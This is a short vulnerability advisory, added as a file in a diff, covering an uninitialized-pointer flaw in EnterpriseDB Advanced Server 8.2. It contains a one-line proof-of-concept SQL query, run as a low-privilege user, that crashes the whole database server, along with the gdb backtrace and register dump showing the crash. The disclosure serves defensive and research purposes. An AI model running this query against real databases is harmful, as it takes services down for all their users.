@@ -1,0 +1,56 @@
+source: http://www.securityfocus.com/bid/25481/info
+
+EnterpriseDB Advanced Server is prone to an uninitialized-pointer vulnerability.
+
+Authenticated attackers can exploit this issue to cause denial-of-service conditions. Given the nature of this vulnerability, remote code execution may also be possible, but this has not been confirmed.
+
+EnterpriseDB Advanced Server 8.2 is vulnerable; other versions may also be affected.
+
+
+1) Connect to one vulnerable EnterpriseDB as a low level user (the
+execution privilege over the pldbg_* function is granted by default).
+2) Execute the following query:
+
+edb=> select pldbg_abort_target(1094861636); -- 0x41424344 in decimal
+
+(gdb) where
+#0  0x00ba81db in sendBytes ()
+from /opt/EnterpriseDB/8.2/dbserver/lib/pldbgapi.so
+#1  0x00ba82a1 in sendUInt32 ()
+from /opt/EnterpriseDB/8.2/dbserver/lib/pldbgapi.so
+#2  0x00ba82e3 in sendString ()
+from /opt/EnterpriseDB/8.2/dbserver/lib/pldbgapi.so
+#3  0x00ba8880 in pldbg_abort_target ()
+from /opt/EnterpriseDB/8.2/dbserver/lib/pldbgapi.so
+#4  0x0816669d in ExecMakeFunctionResult ()
+#5  0x08168d51 in ExecProject ()
+#6  0x0817544d in ExecResult ()
+#7  0x08162f65 in ExecProcNode ()
+#8  0x08161931 in ExecutorRun ()
+#9  0x081fa2e3 in PortalRunSelect ()
+#10 0x081fb12a in PortalRun ()
+#11 0x081f5a8b in exec_simple_query ()
+#12 0x081f76ec in PostgresMain ()
+#13 0x081ca356 in ServerLoop ()
+#14 0x081cb2b7 in PostmasterMain ()
+#15 0x081865d7 in main ()
+(gdb) x /i $pc
+0xba81db <sendBytes+11>:        mov    (%eax),%eax
+(gdb) i r
+eax            0x41424344       1094861636
+ecx            0x4      4
+edx            0xbff46c04       -1074500604
+ebx            0xbacbd8 12241880
+esp            0xbff46bc0       0xbff46bc0
+ebp            0xbff46be8       0xbff46be8
+esi            0x4      4
+edi            0xbab597 12236183
+eip            0xba81db 0xba81db
+eflags         0x10286  66182
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+
+The complete database server (droping all active conections) crashes. 
